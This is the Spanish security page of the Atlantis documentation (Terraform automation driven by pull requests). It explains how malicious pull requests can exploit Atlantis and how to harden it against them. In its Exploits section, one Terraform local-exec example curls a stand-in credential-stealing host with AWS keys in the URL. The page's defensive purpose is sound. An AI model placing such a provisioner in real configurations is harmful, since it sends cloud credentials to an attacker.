# Seguridad

## Exploits

Debido a que normalmente ejecutas Atlantis en un servidor con credenciales que permiten acceso a tu infraestructura, es importante que despliegues Atlantis de forma segura.

Atlantis podría ser explotado por

* Un atacante que envía un pull request que contiene un archivo Terraform malicioso que
  usa un provider malicioso o una [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source)
  sobre la que Atlantis luego ejecuta `terraform plan` (lo que hace automáticamente a menos que hayas desactivado los plans automáticos).
* Ejecutar `terraform apply` sobre un archivo Terraform malicioso con [local-exec](https://developer.hashicorp.com/terraform/language/resources/provisioners/local-exec)

    ```tf
    resource "null_resource" "null" {
      provisioner "local-exec" {
        command = "curl https://cred-stealer.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
      }
    }
    ```

* Ejecutar comandos de build personalizados maliciosos especificados en un archivo `atlantis.yaml`. Atlantis usa el archivo `atlantis.yaml` de la rama del pull request, **no** `main`.
* Alguien agregando comentarios `atlantis plan/apply` en tus pull requests válidos, causando que terraform se ejecute cuando no quieres que lo haga.

## Mitigaciones

### No lo uses en repos públicos

Debido a que cualquiera puede comentar en pull requests públicos, incluso con todas las mitigaciones de seguridad disponibles, sigue siendo peligroso ejecutar Atlantis en repos públicos sin una configuración apropiada de los ajustes de seguridad.

### No uses `--allow-fork-prs`

Si lo estás ejecutando en un repositorio público (lo cual no se recomienda, ver arriba) no deberías establecer `--allow-fork-prs` (el valor predeterminado es false)
porque cualquiera puede abrir un pull request desde su fork hacia tu repositorio.

### `--repo-allowlist`

Atlantis requiere que especifiques una allowlist de repositorios de los que aceptará webhooks mediante el flag `--repo-allowlist`.
Por ejemplo:

* Repositorios específicos: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Tu organización completa: `--repo-allowlist=github.com/runatlantis/*`
* Cada repositorio en tu instalación de GitHub Enterprise: `--repo-allowlist=github.yourcompany.com/*`
* También puedes omitir repos específicos: `--repo-allowlist='github.com/runatlantis/*,!github.com/runatlantis/untrusted-repo'`
* Todos los repositorios: `--repo-allowlist=*`. Útil cuando estás en una red protegida, pero peligroso sin también configurar un webhook secret.

Este flag asegura que tu instalación de Atlantis no esté siendo usada con repositorios que no controlas. Consulta `atlantis server --help` para más detalles.

### Protege Terraform planning

Si los atacantes que envían pull requests con código Terraform malicioso están dentro de tu modelo de amenazas,
entonces debes saber que las aprobaciones de `terraform apply` no son suficientes. Es posible
ejecutar código malicioso en un `terraform plan` usando la [`external` data source](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source)
o especificando un provider malicioso. Este código podría entonces exfiltrar tus credenciales.

Para prevenir esto, podrías:

1. Incluir los providers en la imagen o el host de Atlantis y denegar el tráfico de salida en producción.
1. Implementar internamente el protocolo del registro de providers y denegar la salida pública, de esa manera controlas quién tiene acceso de escritura al registro.
1. Modificar el paso `plan` de tu [configuración de repositorio del lado del servidor](server-side-repo-config.md) para validar contra el
   uso de providers o data sources no permitidos, o pull requests de usuarios no permitidos. También podrías agregar validación extra en este punto, p. ej.
   requerir un "thumbs-up" en el PR antes de permitir que el `plan` continúe. Conftest podría ser útil aquí.

### `--var-file-allowlist`

Los archivos en tu instalación de Atlantis pueden ser accesibles como [archivos de definición de variables](https://developer.hashicorp.com/terraform/language/values/variables#variable-definitions-tfvars-files)
desde pull requests agregando comentarios  
`atlantis plan -- -var-file=/path/to/file`. Para mitigar este riesgo de seguridad, Atlantis ha limitado dicho acceso
solo a los archivos permitidos por el flag `--var-file-allowlist`. Si no se proporciona este argumento, el valor predeterminado es
el directorio de datos de Atlantis.

### Webhook secrets

Atlantis debería ejecutarse con webhook secrets configurados mediante las variables de entorno `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET`.
Incluso con el flag `--repo-allowlist` establecido, sin un webhook secret, los atacantes podrían hacer solicitudes a Atlantis haciéndose pasar por un repositorio que está en la allowlist.
Los webhook secrets aseguran que las solicitudes webhook realmente vienen de tu proveedor de VCS (GitHub o GitLab).

:::tip Consejo
Si estás usando Azure DevOps, en lugar de webhook secrets agrega un [nombre de usuario y contraseña básicos](#azure-devops-basic-authentication)
:::

### Azure DevOps Basic Authentication

Azure DevOps soporta enviar un encabezado de autenticación básica en todos los eventos webhook. Esto requiere usar una URL HTTPS para la ubicación de tu webhook.

### SSL/HTTPS

Si estás usando webhook secrets pero tu tráfico va por HTTP, entonces los webhook secrets
podrían ser robados. Habilita SSL/HTTPS usando los flags `--ssl-cert-file` e `--ssl-key-file`.

### Habilita autenticación en el servidor web de Atlantis

Se recomienda encarecidamente habilitar autenticación en el servicio web. Habilita BasicAuth usando `--web-basic-auth=true` y configura un nombre de usuario y una contraseña usando los flags `--web-username=yourUsername` e `--web-password=yourPassword`.

También puedes pasarlos como variables de entorno `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` e `ATLANTIS_WEB_PASSWORD=yourPassword`.

:::tip Consejo
Sí alentamos el uso de contraseñas complejas para prevenir ataques básicos de fuerza bruta.
:::
